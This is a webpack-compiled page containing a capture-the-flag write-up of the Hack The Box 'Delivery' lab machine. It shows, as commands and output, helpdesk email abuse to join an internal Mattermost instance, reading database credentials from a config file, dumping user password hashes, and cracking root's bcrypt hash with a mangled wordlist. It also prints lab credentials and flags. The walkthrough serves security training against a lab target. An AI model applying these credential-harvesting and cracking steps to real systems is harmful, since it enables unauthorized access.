"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7356],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),p=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(s.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(n),d=a,h=u["".concat(s,".").concat(d)]||u[d]||m[d]||o;return n?r.createElement(h,i(i({ref:t},c),{},{components:n})):r.createElement(h,i({ref:t},c))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[u]="string"==typeof e?e:a,i[1]=l;for(var p=2;p<o;p++)i[p]=n[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},3067:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>m,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const o={layout:"post",title:"Delivery ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web"],date:"2021/05/30 11:44:00",thumbnail:"/img/HackTheBox/delivery.png",toc:!0},i="Information",l={unversionedId:"HackTheBox/Delivery/write-up",id:"HackTheBox/Delivery/write-up",title:"Delivery ",description:"- Name: Delivery",source:"@site/writeups/HackTheBox/Delivery/write-up.md",sourceDirName:"HackTheBox/Delivery",slug:"/HackTheBox/Delivery/write-up",permalink:"/writeups/HackTheBox/Delivery/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"web",permalink:"/writeups/tags/web"}],version:"current",frontMatter:{layout:"post",title:"Delivery ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web"],date:"2021/05/30 11:44:00",thumbnail:"/img/HackTheBox/delivery.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"HTB Cyber Santa CTF 2021 - Write-up",permalink:"/writeups/HackTheBox/CyberSantaCTF/2021/write-up"},next:{title:"Doctor ",permalink:"/writeups/HackTheBox/Doctor/write-up"}},s={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Web discovery",id:"web-discovery",level:2},{value:"Web exploitation",id:"web-exploitation",level:2},{value:"System exploitation",id:"system-exploitation",level:2},{value:"Bonus",id:"bonus",level:2}],c={toc:p},u="wrapper";function m(e){let{components:t,...o}=e;return(0,a.kt)(u,(0,r.Z)({},c,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"information"},"Information"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," Delivery"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://app.hackthebox.eu/machines/308"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"Delivery",src:n(1070).Z,width:"598",height:"381"})),(0,a.kt)("h2",{id:"overview"},"Overview"),(0,a.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap mentalist john\n")),(0,a.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,a.kt)("p",null,"Port and service scan with nmap:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'# Nmap 7.91 scan initiated Tue Jan 26 20:17:53 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.222\nNmap scan report for 10.10.10.222\nHost is up (0.032s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)\n|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)\n|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)\n80/tcp   open  http    nginx 1.14.2\n| http-methods:\n|_  Supported Methods: GET HEAD\n|_http-server-header: nginx/1.14.2\n|_http-title: Welcome\n8065/tcp open  unknown\n| fingerprint-strings:\n|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:\n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest:\n|     HTTP/1.0 200 OK\n|     Accept-Ranges: bytes\n|     Cache-Control: no-cache, max-age=31556926, public\n|     Content-Length: 3108\n|     Content-Security-Policy: frame-ancestors \'self\'; script-src \'self\' cdn.rudderlabs.com\n|     Content-Type: text/html; charset=utf-8\n|     Last-Modified: Tue, 26 Jan 2021 13:56:05 GMT\n|     X-Frame-Options: SAMEORIGIN\n|     X-Request-Id: t7o94xf1fbb87bff1tsup8wjcy\n|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false\n|     Date: Tue, 26 Jan 2021 19:27:29 GMT\n|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re\n|   HTTPOptions:\n|     HTTP/1.0 405 Method Not Allowed\n|     Date: Tue, 26 Jan 2021 19:27:29 GMT\n|_    Content-Length: 0\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8065-TCP:V=7.91%I=7%D=1/26%Time=60106AFC%P=x86_64-unknown-linux-gnu\nSF:%r(GenericLines,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\nSF:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20\nSF:Bad\\x20Request")%r(GetRequest,DF3,"HTTP/1\\.0\\x20200\\x20OK\\r\\nAccept-Ran\nSF:ges:\\x20bytes\\r\\nCache-Control:\\x20no-cache,\\x20max-age=31556926,\\x20pu\nSF:blic\\r\\nContent-Length:\\x203108\\r\\nContent-Security-Policy:\\x20frame-an\nSF:cestors\\x20\'self\';\\x20script-src\\x20\'self\'\\x20cdn\\.rudderlabs\\.com\\r\\nC\nSF:ontent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nLast-Modified:\\x20Tue,\\x\nSF:2026\\x20Jan\\x202021\\x2013:56:05\\x20GMT\\r\\nX-Frame-Options:\\x20SAMEORIGI\nSF:N\\r\\nX-Request-Id:\\x20t7o94xf1fbb87bff1tsup8wjcy\\r\\nX-Version-Id:\\x205\\\nSF:.30\\.0\\.5\\.30\\.1\\.57fb31b889bf81d99d8af8176d4bbaaa\\.false\\r\\nDate:\\x20T\nSF:ue,\\x2026\\x20Jan\\x202021\\x2019:27:29\\x20GMT\\r\\n\\r\\n<!doctype\\x20html><h\nSF:tml\\x20lang=\\"en\\"><head><meta\\x20charset=\\"utf-8\\"><meta\\x20name=\\"vie\nSF:wport\\"\\x20content=\\"width=device-width,initial-scale=1,maximum-scale=1\nSF:,user-scalable=0\\"><meta\\x20name=\\"robots\\"\\x20content=\\"noindex,\\x20no\nSF:follow\\"><meta\\x20name=\\"referrer\\"\\x20content=\\"no-referrer\\"><title>M\nSF:attermost</title><meta\\x20name=\\"mobile-web-app-capable\\"\\x20content=\\"\nSF:yes\\"><meta\\x20name=\\"application-name\\"\\x20content=\\"Mattermost\\"><met\nSF:a\\x20name=\\"format-detection\\"\\x20content=\\"telephone=no\\"><link\\x20re"\nSF:)%r(HTTPOptions,5B,"HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nDat\nSF:e:\\x20Tue,\\x2026\\x20Jan\\x202021\\x2019:27:29\\x20GMT\\r\\nContent-Length:\\x\nSF:200\\r\\n\\r\\n")%r(RTSPRequest,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nC\nSF:ontent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\\nSF:n\\r\\n400\\x20Bad\\x20Request")%r(Help,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Requ\nSF:est\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20\nSF:close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(SSLSessionReq,67,"HTTP/1\\.1\\x204\nSF:00\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\nSF:\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(TerminalServerC\nSF:ookie,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/p\nSF:lain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Req\nSF:uest");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Jan 26 20:19:44 2021 -- 1 IP address (1 host up) scanned in 111.16 seconds\n')),(0,a.kt)("h2",{id:"web-discovery"},"Web discovery"),(0,a.kt)("p",null,"On ",(0,a.kt)("a",{parentName:"p",href:"http://10.10.10.222/"},"http://10.10.10.222/")," we can see a link to ",(0,a.kt)("a",{parentName:"p",href:"http://helpdesk.delivery.htb/"},"http://helpdesk.delivery.htb/")," and\nanother one ",(0,a.kt)("a",{parentName:"p",href:"http://delivery.htb:8065/"},"http://delivery.htb:8065/"),"."),(0,a.kt)("p",null,"So we can set an entry for this local domain:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep delivery\n10.10.10.222 helpdesk.delivery.htb\n10.10.10.222 delivery.htb\n")),(0,a.kt)("p",null,"At ",(0,a.kt)("a",{parentName:"p",href:"http://helpdesk.delivery.htb/"},"http://helpdesk.delivery.htb/")," the software running is ",(0,a.kt)("a",{parentName:"p",href:"https://osticket.com/"},"osTicket"),"."),(0,a.kt)("p",null,"We can find the ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/osTicket/osTicket"},"source code")," online, it may be\nmore efficient to find page than enumerating with ffuf."),(0,a.kt)("h2",{id:"web-exploitation"},"Web exploitation"),(0,a.kt)("p",null,"Create a new ticket."),(0,a.kt)("p",null,"The app tell you you have an email address: ",(0,a.kt)("a",{parentName:"p",href:"mailto:8902868@delivery.htb"},"8902868@delivery.htb")),(0,a.kt)("p",null,"Now you can go on the Mattermost page (port 8065) and register using\nthe email we received and a random password."),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"8902868@delivery.htb")," / ",(0,a.kt)("inlineCode",{parentName:"p"},"password1234A!")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://delivery.htb:8065/should_verify_email?email=8902868%40delivery.htb"},"http://delivery.htb:8065/should_verify_email?email=8902868%40delivery.htb")),(0,a.kt)("p",null,"Mattermost will send you a registration check link by email."),(0,a.kt)("p",null,"So refresh the ticket page, eg. ",(0,a.kt)("a",{parentName:"p",href:"http://helpdesk.delivery.htb/tickets.php?id=8902868"},"http://helpdesk.delivery.htb/tickets.php?id=8902868")),(0,a.kt)("p",null,"And a new message appeared with the content of the registration mail:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=rboda3gqxmnesjgrrt89kb5hriekno18hr8wqpar53km93q4mg5dsj63g31tujaq&email=8902868%40delivery.htb\n")),(0,a.kt)("p",null,"We can use the link to validate our account and then login to Mattermost."),(0,a.kt)("p",null,"The idea is that some companies will will automatically accepts registrations\non the internal chat app from emails with a ",(0,a.kt)("inlineCode",{parentName:"p"},"@company")," domain for their employees\nbut some services like a issue tracker, support panel, will be configured\nto automatically generate an email address for each issue that the user can\nread and receive some account validation links and gain unauthorized access\nto the internal chat app."),(0,a.kt)("p",null,"The home page contains two messages, the first one gives us credentials that are working\nover ssh:"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!"),(0,a.kt)("p",{parentName:"blockquote"},'Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"')),(0,a.kt)("p",null,"The second message must be a hint for the following steps:"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.")),(0,a.kt)("h2",{id:"system-exploitation"},"System exploitation"),(0,a.kt)("p",null,"Grab the user flag:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ssh maildeliverer@10.10.10.222\n\nmaildeliverer@Delivery:~$ id\nuid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)\n\nmaildeliverer@Delivery:~$ cat user.txt\n4aa9052226e3c4d3d653259d524f1fa9\n")),(0,a.kt)("p",null,"What have we in the user directory?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"maildeliverer@Delivery:~$ ls -lhA\ntotal 5.4M\nlrwxrwxrwx 1 root          root             9 Dec 28 07:04 .bash_history -> /dev/null\n-rw-r--r-- 1 maildeliverer maildeliverer  220 Dec 26 09:01 .bash_logout\n-rw-r--r-- 1 maildeliverer maildeliverer 3.5K Dec 26 09:01 .bashrc\ndrwx------ 3 maildeliverer maildeliverer 4.0K Dec 28 06:58 .gnupg\n-rw------- 1 maildeliverer maildeliverer  230 Jan 26 15:39 .mysql_history\n-rw-r--r-- 1 maildeliverer maildeliverer  807 Dec 26 09:01 .profile\n-r-------- 1 maildeliverer maildeliverer   33 Jan 26 14:32 user.txt\n\nmaildeliverer@Delivery:~$ cat .mysql_history\nshow databases;\nuse mattermost;\nshow tables;\nselect * from users;\nselect * from Users;\nselect Username, Password from Users;\nshow databases\n;\nuse mattermost\nshow tables\n;\nselect * from Users;\nselect Username, Password from Users;\n")),(0,a.kt)("p",null,"Let's find the mattermost install directory it must contains some SQL credentials\nwhere we could use to dump the same table as in our mysql history."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"maildeliverer@Delivery:~$ find / -name mattermost -type d 2>/dev/null\n/opt/mattermost\n/var/lib/mysql/mattermost\n")),(0,a.kt)("p",null,"We can find there is a SQL section in the configuration:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'maildeliverer@Delivery:~$ grep -i sql /opt/mattermost/config/config.json\n    "SqlSettings": {\n        "DriverName": "mysql",\n')),(0,a.kt)("p",null,"Let's open the file with less, search ",(0,a.kt)("inlineCode",{parentName:"p"},"SqlSettings"),", and see:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-json"},'    "SqlSettings": {\n        "DriverName": "mysql",\n        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s",\n        "DataSourceReplicas": [],\n        "DataSourceSearchReplicas": [],\n        "MaxIdleConns": 20,\n        "ConnMaxLifetimeMilliseconds": 3600000,\n        "MaxOpenConns": 300,\n        "Trace": false,\n        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",\n        "QueryTimeout": 30,\n        "DisableDatabaseSearch": false\n    }\n')),(0,a.kt)("p",null,"It seems we have the creds of the DB in ",(0,a.kt)("inlineCode",{parentName:"p"},"DataSource"),"."),(0,a.kt)("p",null,"So we can connect to it and do the same as in our history:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"maildeliverer@Delivery:~$ mysql -u mmuser -p\nEnter password:\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 488\nServer version: 10.3.27-MariaDB-0+deb10u1 Debian 10\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> use mattermost;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [mattermost]> select Username, Password from Users;\n+----------------------------------+--------------------------------------------------------------+\n| Username                         | Password                                                     |\n+----------------------------------+--------------------------------------------------------------+\n| duomox                           | $2a$10$ehf6UdxrQX4MHIfe8ohIhe4k.IvQ89gvpg4UVjYrkonki9Vy3j9Qq |\n| surveybot                        |                                                              |\n| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |\n| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |\n| moi                              | $2a$10$1huj5gajGm0lofKJDwx5iOVwlxXlyts1LFfpM6YcGMiaAK7KE1Ee2 |\n| one                              | $2a$10$5b5xCPsSvpVQ7Ed.LA/UnOcv7ag4FHJ1ZWV4j/VEBb9y4XBBy3ywW |\n| user1234                         | $2a$10$LcxQKEkWX82gx8cIHT46tOklDQVYh.BVIfeFGH3gMMkxvyarjysqe |\n| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |\n| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |\n| channelexport                    |                                                              |\n| lopes                            | $2a$10$x1IJFMel6US3MUP.CdLm.eC0WAt3jx8xDt/4Mwr475H3zD3WnkwSy |\n| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |\n| one1                             | $2a$10$p/0e8pFihTZBHZmPb1mv6O553J5/oWythXgXYO4Zg1aDe2ZDjyCTq |\n+----------------------------------+--------------------------------------------------------------+\n13 rows in set (0.000 sec)\n")),(0,a.kt)("p",null,"Let's try to crack the root account. The hint told us not to try rockyou but to\nuse some mangling rules on the word ",(0,a.kt)("inlineCode",{parentName:"p"},"PleaseSubscribe!"),"."),(0,a.kt)("p",null,"With the tool mentalist I created a mangling rule for JtR:"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"root.mentalist")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-json"},'{"nodes": [{"attributes": [{"class_name": "StringListAttr", "kwargs": {"strings": ["PleaseSubscribe!"], "label": "String: \'PleaseSubscribe!\'"}}], "type_": "base"}, {"attributes": [{"class_name": "RangeAttr", "kwargs": {"start": 0, "end": 101, "zfill": 0, "label": "Numbers: Small 0-100"}}], "type_": "Append"}], "version": "1.0"}\n')),(0,a.kt)("p",null,"I took the string in input and appended a short list of numbers and then exported\nthe full wordlist: root.txt."),(0,a.kt)("p",null,"Then we can crack it with JtR:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ john --format=bcrypt hash.txt --wordlist=root.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nPleaseSubscribe!21 (root)\n1g 0:00:00:01 DONE (2021-01-30 19:22) 0.7751g/s 27.90p/s 27.90c/s 27.90C/s PleaseSubscribe!0..PleaseSubscribe!35\nUse the \"--show\" option to display all of the cracked passwords reliably\n")),(0,a.kt)("p",null,"So we got the root password and can connect with ",(0,a.kt)("inlineCode",{parentName:"p"},"su"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"maildeliverer@Delivery:~$ su root\nPassword:\nroot@Delivery:/home/maildeliverer# cd\nroot@Delivery:~# cat root.txt\n2d7cd15d8e1a89279b08dc5948dab25d\n")),(0,a.kt)("h2",{id:"bonus"},"Bonus"),(0,a.kt)("p",null,"ippsec contacted me to mention the presence of ",(0,a.kt)("inlineCode",{parentName:"p"},"/root/note.txt")," which explains\nwhy he created the box:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times. The inspiration for the box is here:\n\n- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c\n\nKeep on hacking! And please don't forget to subscribe to all the security streamers out there.\n\n- ippsec\n")))}m.isMDXComponent=!0},1070:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/delivery-ef5ea171be1c2f0d45feedd58cfb12c2.png"}}]);